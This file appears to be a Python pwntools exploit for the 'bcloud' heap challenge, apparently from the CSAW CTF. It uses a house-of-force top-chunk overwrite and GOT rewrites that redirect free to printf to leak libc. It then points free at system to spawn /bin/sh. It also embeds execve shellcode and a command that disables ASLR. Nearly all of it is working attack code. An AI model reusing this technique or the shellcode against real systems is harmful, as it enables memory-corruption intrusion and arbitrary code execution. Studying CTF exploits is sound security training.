from pwn import *
from random import choice
import sys, os

#readelf -s libc.so.6 | grep system
#echo 0 > /proc/sys/kernel/randomize_va_space

x86_x64_binsh = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
x86_binsh = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

def get_ip():
	p = util.net.getifaddrs()
	for c in p:
		if c.has_key('addr'):
			t = c['addr']
			if t != {}:
				if t['addr'] != '127.0.0.1':
					return t['addr']
	else:
		return 0
file_name = './bcloud'
binary = ELF(file_name)
HOST = "127.0.0.1"#'pwn.chal.csaw.io'
PORT = 127
#HOST = "pwn.chal.csaw.io"
#PORT = 8002
LOCAL = 1
IP = get_ip()

if len(sys.argv) > 1:
	LOCAL = 0
	p = remote(HOST, PORT)
	pid = None
else:
	p = process([binary.path])
	pid = p.proc.pid

def pause():
	if not LOCAL:
		raw_input('[paused]')
	else:
		log.info('[PID]: %s' % pid)
		util.proc.wait_for_debugger(pid)

def ag(): #attach gdb
	gdb.attach(pid)
pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"

def new(size, content):
	p.recvuntil("option--->>")
	p.send("1\n")
	
	p.recvuntil("content:")
	p.send(str(size) + "\n")
	p.recvuntil("content:")
	p.send(content + "\n")
	
def show():
	p.recvuntil("option--->>")
	p.send("2\n")

def edit(id, content):
	p.recvuntil("option--->>")
	p.send("3\n")
	p.recvuntil("id:")
	p.send(str(id) + "\n")
	p.recvuntil("content:")
	p.send(content + "\n")

def delete(id):
	p.recvuntil("option--->>")
	p.send("4\n")
	p.recvuntil("id:")
	p.send(str(id) + "\n")
	
def syn():
	p.recvuntil("option--->>")
	p.send("5\n")
	
	
def exploit():
	pause();
	#leak Heap Address
	p.send("a"*0x40)
	tmp = p.recvuntil("Welcome")
	heap_leak = u32(tmp[85:89])
	print "[+] Heap leak:", hex(heap_leak)
	#Overwrite Top chunk
	p.send("z"* 0x40)
	p.send(p32(0xffffffff) + "\n")
	
	top_chunk = heap_leak + 204
	target = 0x0804B120
	evil_size = target - 4*2 - top_chunk - 8
	print "[+] Evil size:", hex(evil_size)
	
	new(evil_size, "a"*0x18) 	#malloc to pointer list
	new(100, p32(target)) 		#edit pointer list, now edit note3 will edit the pointer list
	
	free_got = 0x0804B014
	printf_addr = 0x80484D0
	printf_got = 0x804b010
	note1size = 0x804b0a0
	edit(2, p32(target) + p32(printf_got) + p32(note1size))
	edit(2, p32(0x64)*2)		#make note1, note2 writable
	
	edit(0, p32(target) + p32(free_got) + p32(printf_got))
	edit(1, p32(printf_addr))
	
	#leak libc
	delete(2)
	libc_leak = u32(p.recvuntil("Delete")[1:5])
	print "[+] Libc leak:", hex(libc_leak)
	system_addr = libc_leak - 0xd100
	binsh = libc_leak + 0x11343c
	
	edit(0, p32(target) + p32(free_got) + p32(binsh))
	edit(1, p32(system_addr))	#rewrite free() with system()
	
	delete(2)	#call system("/bin/sh")
	print "[+] Execute Shell"
	p.interactive()

if __name__ == '__main__':
	exploit()
